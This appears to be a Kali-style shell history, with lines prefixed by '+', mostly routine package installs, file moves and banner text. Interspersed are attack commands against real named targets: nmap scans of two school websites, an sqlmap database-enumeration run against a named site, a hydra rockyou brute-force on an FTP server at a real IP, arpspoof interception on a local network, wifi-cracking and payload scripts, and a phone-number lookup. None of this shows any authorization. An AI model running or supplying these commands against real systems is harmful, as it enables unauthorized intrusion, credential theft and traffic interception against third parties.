+cd /media/root/Stephanware/
+ls -n
+cd ..
+cd GhostDrive/
+cd StephanWarePC/
+ls
+dir
+cd APK
+ls
+dir | grep ludo
+dir | grep LUDO
+dir | grep lu
+exit
+ls
+cd /
+ls -n
+cd root/
+ls -n
+nano script/mountall.sh 
+mountall
+toilet -f smblock metal "Hi"
+toilet -f smblock --fileter metal "Hi"
+toilet -f smblock --filter metal "Hi"
+toilet -f smblock --filter metal "Hello WOrld"
+l
+toilet -f smblock --filter metal "Hello WOrld"
+l
+umount /root/Desktop
+umount /home/Desktop
+nano script/mountall.sh 
+mountalls
+mountall
+hackwifi
+toilet -f smblock --filter metal "Hacking Wifi"
+toilet -f big --filter metal "Hacking Wifi"
+nano script/wificrack/hackwifi.sh 
+hackwifi
+clear
+hackwifi
+toilet -f big --filter metal "Mr.Stephan"
+wificap
+exig
+exit
+venom
+exit
+venom
+showfigfonts
+toilet -f shadow --filter metal "hi"
+toilet -f smblock shadow --filter metal "hi"
+toilet -f shadow smblockc --filter metal "hi"
+toilet -f shadow smblock --filter metal "hi"
+toilet -f shadow:smblock --filter metal "hi"
+toilet -f standard --filter metal "hello"
+venom
+nano script/venom.sh 
+dir script
+ls -n script
+cd /home/python/
+ls
+cd 
+cd /home/payload/
+ls
+cd apk/
+lsl
+ls
+nano venom.sh 
+sh venom.sh 
+nano venom.sh 
+sh venom.sh 
+nano venom.sh 
+cp /home/payload/apk/venom.sh /home/script/
+nano venom.sh 
+cd /home/script/
+nano venom.sh 
+nano /root/.bashrc
+venomm
+venom
+cd /home/
+cd desktop/
+ls
+ls -n
+mv *.* /home/Desktop
+mv *.* /root/Desktop/
+mv /root/Desktop/*.* 
+mv /root/Desktop/*.* /home/desktop/
+exit
+dir
+cd handshakes/
+ls -n
+l
+venom
+toilet -f smblock --filter border:metal "Stephanware"
+toilet -f smblock --filter metal "Stephanware"
+toilet -f smblock --filter metal "Scriptware"
+toilet -f smblock --filter border:metal "Scriptware"
+toilet -f big --filter border:metal "Scriptware"
+toilet -f big --filter color:rd border:metal "Scriptware"
+toilet -f big --filter color:red border:metal "Scriptware"
+toilet -f big --filter  border:metal "Scriptware"
+ifconfig
+venom
+hackwifi
+ifconfig
+venom
+ln -s /home/script/txt/
+ln -s /home/script/txt /root/
+ls
+ls -n
+dir txt
+cd home
+dir
+ls -n
+cd personal/
+ls 
+ls -n
+cat mydob 
+ln -s /home/personal/ /root/
+cd
+cd personal
+cd 
+touch personal/sxcran_exmroll
+nano personal/sxcran_exmroll 
+mv personal/sxcran_exmroll personal/sxcran_exmroll.sh
+cd personal
+ls -n
+sh sxcran_exmroll.sh 
+nano sxcran_exmroll.sh 
+sh sxcran_exmroll.sh 
+nano sxcran_exmroll.sh 
+sh sxcran_exmroll.sh 
+nano sxcran_exmroll.sh 
+sh sxcran_exmroll.sh 
+nano sxcran_exmroll.sh 
+sh sxcran_exmroll.sh 
+sh personal/sxcran_exmroll.sh 
+ifconfig
+airmon-ng stop wlan0mon
+ifconfig
+ifconfig wlan0 up
+ifconfig
+ifconfig wlan0 up
+ifconfig
+ifconfig wlan0 up
+ls
+ls -n
+cd Backdoors/
+ls -n
+cat cmd
+toilet -f standard --filter metal "Mounting Disk"
+toilet -f standard --filter border:metal "Mounting Disk"
+nano script/mountall.sh 
+mountall
+adbwifi
+wifiadb
+toilet -f smblock --filter border:metal "Adb Wifi"
+toilet -f smblock --filter border:metal "adb Wifi"
+toilet -f smblock --filter border:metal "ADB Wifi"
+toilet -f smblock --filter metal "ADB Wifi"
+toilet -f standard --filter metal "ADB Wifi"
+toilet -f standard --filter border:metal "ADB Wifi"
+nano script/adb-sh/wifiadb.sh 
+sh personal/sxcran_exmroll.sh 
+cat cmd
+hydra
+hotspot
+nmap -T4 -vv -A http://www.kausarcollegeofeducation.com/admin/index.asp
+nmap -T4 -vv -A www.kausarcollegeofeducation.com
+nmap -T4 -vv -A /home/scan/kausar_nmap
+nmap -T4 -vv -A www.kausarcollegeofeducation.com >/home/scan/kausar_nmap
+nmap -T4 -vv -A www.sxcran.org >/home/scan/sxcran/sxcran_ip
+nmap -T4 -vv -A www.sxcran.org >/home/scan/sxcran/sxcran_nmap
+ln -s /home/scan/ /root/
+ls -n
+cd scn
+cd scan
+cd 
+cd scan
+ls -
+ls -n
+cd sxcran/
+ls
+cat sxcran_ip 
+cd ..
+dir
+mkdir kausar
+*.* kausar
+mv kausar_nmap kausar
+mv kausar_nsplookup kausar
+cd kausar/
+lsl
+ls
+cat kausar_nsplookup 
+nslookup www.kausarcollegeofeducation.com
+nslookup www.kausarcollegeofeducation.com > /home/scan/kausar_nsplookup
+cat /home/scan/
+cd /home/scan/
+ls -n
+cat kausar_nsplookup 
+ls -n
+mkdir sxcran
+cd sxcran/
+nslookup www.sxcran.org
+nslookup www.sxcran.org > sxcran_ip
+nmap -T4 -vv -A www.sxcran.org
+nslookup www.sxcran.org > sxcran_ip
+ls -
+ls -n
+cat sxcran_ip 
+cat sxcran_nmap 
+cd home
+ls -n
+mkdir scan
+cd scan/
+touch kausarCollegeofEducation
+nano kausarCollegeofEducation 
+nslookup www.sxcran.org
+whois
+whois 182.71.213.139
+whois 182.71.213.139  > /home/scan/sxcran/whois
+cat /home/scan/kausar/kausar_nmap 
+whois 182.50.135.115
+cd /home/scan/sxcran/
+ls -n
+nano nmap_scan
+nano dnslookup
+cat dnslookup 
+nano scan/sxcran/port_scan
+route -a
+route
+route -n
+route -l
+route -a
+route 
+l
+phonefy -n +9199950564
+l
+cd /MITMf
+cd /
+ls
+ls -n
+exit
+ln -s /home/script/txt/apt /root/
+echo "apt-get install filezilla" >> apt 
+cat apt
+cd scan
+cd sxcran/
+ls
+cat sxcran_
+cat sxcran_ip 
+cat sxcran_nmap 
+sh personal/sxcran_exmroll.sh 
+filezilla
+apt-get install filezilla
+sqlmap -u https://www.fleurlis.com.tw/en/wedding.php?id=1 --dbs
+nano script/subterfuge.sh
+chmox +X script/subterfuge.sh 
+chmod +X script/subterfuge.sh 
+sh script/subterfuge.sh 
+xdg-open https://github/com/Subterfuge-Framework/Subterfuge
+xdg-open https://github.com/Subterfuge-Framework/Subterfuge
+cd Downloads/
+ls -n
+xdg-open /home/download/
+cd 
+cd /home/script/
+nano links.sh
+### Linux Packages
+If you are using a Debian based Linux distribution, you will need to install the following packages _(or their equivalent)_:
+`apt-get -y install apache2 mysql-server php php-mysqli php-gd libapache2-mod-php`
+clear
+apt-get -y install apache2 mysql-server php php-mysqli php-gd libapache2-mod-php
+apt-get -y install libapache2-mod-php
+cd /home/download/
+ls
+cd 
+cd Downloads/
+ls
+ls -n
+mkdir github
+cd github/
+git clone https://github.com/Subterfuge-Framework/Subterfuge.git
+ls -n
+cd Subterfuge/
+ls -n
+python subterfuge.py 
+cat cmd
+echo " hydra -L /home/wordlist/rockyou.txt -P /home/wordlist/rockyou.txt ftp://182.50.135.115 " >> cmd
+cat cmd
+sudo add-apt-repository ppa:gezakovacs/ppa
+sudo apt-get install unetbootin
+apt-get install youtube-dl
+cd Videos/
+ls
+cd 
+cd Downloads/
+ls
+mkdir videos
+youtube-dl https://www.youtube.com/watch?v=gIwSaNnlVmA
+hydra -l /home/wordlist/rockyou.txt -p /home/wordlist/rockyou.txt ftp://182.50.135.115
+hydra
+hydra -L /home/wordlist/rockyou.txt -P /home/wordlist/rockyou.txt ftp://182.50.135.115
+clear
+hydra -L /home/wordlist/rockyou.txt -P /home/wordlist/rockyou.txt ftp://182.50.135.115
+ls -n
+less README.md 
+cd Desktop/
+youtube-dl https://www.youtube.com/watch?v=gIwSaNnlVmA
+mkdir pdf
+mv *.pdf pdf
+ls -n
+cd 
+mkdir /home/dvwa
+mount -B /home/download/dvwa/DVWA-1.0.7.iso /home/dvwa/
+mount -B /home/download/dvwa/DVWA-1.0.7.iso /home/dvwa
+mount  /home/download/dvwa/DVWA-1.0.7.iso /home/dvwa
+mountall
+ls -n
+dir
+didr
+dir
+dkri
+ls
+ls -n
+qrcode
+xdg-open /root/.set/reports/qrcode_attack.png 
+cd  /root/.set/reports/
+ls -n
+mv qrcode_attack.png 192.168.225.39
+ls -n
+xdg-open 192.168.225.39 
+cd 
+ls -n script
+dir script
+nano script/qrcode.sh
+chmod +x script/qrcode.sh 
+nano /root/.bashrc
+qrcode
+nano /root/.bashrc
+nano script/qrcode.sh 
+
+nano script/qrcode.sh 
+ifconfig
+clear
+setoolkit
+systemctl restart apache2.service
+jiofi
+xdg-open /media/root/Stephanware/videos/music/
+hackwifi
+hotspot
+ls -n
+cd home
+dir
+ls 0
+ls
+ls -n
+cd download/
+cd pdf/
+mv *.pdf /home/pdf/
+ls
+cd ..
+cd /home/pdf/
+ls
+ls -n
+apt-get install brasero
+ls -n
+ifconfig
+wifimonitor
+iwconfig
+airmon-ng start wlan0
+iwconfig
+wifimonitor
+airmon-ng stop wlan0
+ifconfig
+airmon-ng stop wlan0mon
+ifcofig
+ifconfig
+ifconfig wlan0 up
+ifcong
+ifconfig
+hackwifi
+ls -n script
+ls script
+ls
+cd /media/root/
+didr
+ls
+adb shell
+adb devices
+cd c_files/
+mv *.jpg *.zippped
+ls -
+ls -n
+mv *.jpg *.zip
+zip *.jpg /media/root/Stephanware/videos/TED/restricted/BigTits,BigAss/hi.zip
+netdiscover
+ping 192.168.43.48
+ping 192.168.43.1
+cat cmd
+nano cmd 
+ip route 
+dnslookup demo.testfire.net
+ls -n
+cd /root/
+cd /home/
+ls -n
+cd personal/
+ls -n
+ip route
+arpspoof -i wlan0 -t 192.168.43.1 192.168.43.48
+arpspoof -i wlan0 -t 192.168.43.48 192.168.43.1
+path
+locate path
+cat path
+cd /home/script/txt/
+ls -n
+ln -s /home/script/txt/path /root/
+cd 
+cat path
+nano path
+cd /run/user
+ls -n
+cd 0
+ls -
+ls -n
+cd gvfs
+ls -n
+cd mtp\:host\=%5Busb%3A001%2C008%5D/
+ls
+cd Internal\ shared\ storage/
+cd /media/root/
+ls
+dir personal
+locate VCARD
+cp /home/contact/VCARD_20180601_201319.vcf /run/user/0/gvfs/mtp\:host\=%5Busb%3A001%2C008%5D/Internal\ shared\ storage/vCard/
+cd /home/contact/
+ls 
+mv VCARD_20180601_201319.vcf Mummy_vCard_20180603.vcf
+ls -n
+cat Mummy_vCard_20180603.vcf 
+wc -l Mummy_vCard_20180603.vcf 
+ls -n
+wc -l My_Entire_Contact_20180603.vcf 
+cat My_Entire_Contact_20180603.vcf 
+cat path
+cd /run/user/0/gvfs/mtp\:host\=%5Busb%3A001%2C008%5D/
+l
+ls
+cd Internal\ shared\ storage/
+ls
+ls -n
+mkdir vCard
+ls -n
+cd vCard/
+ls -n
+cd ..
+ls -n
+cd ..
+c d..
+cd ..
+cd 
+cd /run/user/0/gvfs
+ls
+cd mtp\:host\=%5Busb%3A001%2C010%5D/
+ls
+sl
+ls
+cls
+ls
+cd ...
+ls 
+ls -n
+wc -l 00001.vcf 
+cat 00001.vcf 
+cat cmd
+echo "wc -l <file-list.txt or anything.vCard >">>cmd
+cat cmd
+nano cmd 
+mountall
+vm
+vim
+apt-get install apache2
+figlet "apt-get install"
+figlet "Reena Soren "
+cat apt
+figlet "Commands"
+l
+figlet "Commands"
+figlet "Command"
+history
+arptables
+arptables --h
+arptables -h
+treeview
+apt
+apt lisst
+apt list
+apt list | grep installed
+modprobe vboxdrv
+sudo modprobe vboxdrv
+sudo
+su
+apt-get install txt2html
+apt-get install treevieww
+apt-get install treeview
+apt-get install brasero
+imagemagick
+apt-get install dictionaryreader.app
+apt-get install arptables
+apt-get install virtualbox
+virtualbox
+cat allCommand 
+cat cmd
+ls -n
+cat path
+cat profiles.csv 
+whoami
+w
+wc -l password.txt 
+cat password.txt 
+hackwifi
+exit
+ping google.com
+fdisk -n
+fdisk -l
+cd /dev/sd3
+cd /media/root/
+ls -n
+cd Stephanware/
+ls -n
+cat webserver.sh 
+nano webserver.sh 
+ls -al
+ls
+touch .hello
+ls -n
+ls -al
+ls -n
+free
+du -u
+du -sh
+du 
+df
+df -sh
+du -sh
+freee
+w
+uname -a
+la
+call
+cal
+whereis brasero
+where apache2
+whereis apache2
+ps
+ps aux
+bg
+fg
+ps -aux
+head /root/.bashrc
+les /root/.bashrc
+less /root/.bashrc
+wifi
+nano /root/.bashrc
+cat allCommand 
+cat cmd
+airmon-ng stop wlan0mon
+exit
+apt
+apt search torrent
+apt-get install bittorrent-gui
+apt search qrcode
+apt-get install python-qrcode
+apt-get install python3-qrcode
+apt-get install libimager-qrcode-perl
+libimager
+libimager-perl
+locate qrcode
+locate github
+dir git
+ls github
+cat github/
+cat github.sh
+ls -n
+cd github/
+ls
+cat github.sh 
+cd ..
+cd github/
+cd rufus/
+lsl
+ls
+less README.md 
+c d
+cd 
+ls -n github/
+cd /home/script/txt/
+touch github
+ln -s /home/script/txt/github /root/
+mv github github-links
+ln -s /home/script/txt/github-links /root/
+cd 
+cat github-links 
+echo "https://github.com/ashishb/android-security-awesome" >> github-links 
+cat github-links 
+touch link
+nano l
+nano link \
+nano link 
+apt-get updatet
+apt-get update
+cd /home
+cd download/
+ls -n
+cd *.pdf /home/pdf
+mv *.pdf /home/pdf
+ls -n
+xdg-open /home/download
+cd /home/
+ls -n
+cd pdf
+ls -n
+ls 
+ls -n
+ls -a
+dir | grep packt
+mkdir PACKT
+ls
+cd /home/wordlist/
+ls
+git clone https://github.com/kennyn510/wpa2-wordlists.git
+ls
+mv wpa2-wordlists wpa-wordlists/
+s
+ls
+git clone https://github.com/kennyn510/wpa2-wordlists.git
+ls
+cd wpa-wordlists/
+git clone https://github.com/kennyn510/wpa2-wordlists.git
+nano script/wifihack.sh 
+cd script
+ls -n
+mv wifihack.sh wifiwlan0mon.sh
+figlet "paths"
+figlet "System-paths"
+toilet -f smblock "github links"
+toilet -f standard "github links"
+figlet "github links"
+toilet -f big  "github links"
+toilet -f big "System paths"
+figlet "System paths"
+history
+history
+dir | grep Tutorial
+dir | TutorialPoint
+mkdir TutorialPoint
+mv | dir | grep Tutoriall TutorialPoint/
+dir > Categories.txt
+cat Categories.txt 
+dir > category.txt
+less category.txt 
+dir > lists.txt
+less lists.txt 
+adb shell screenrecord /storage/sdcard0/capture.mp4
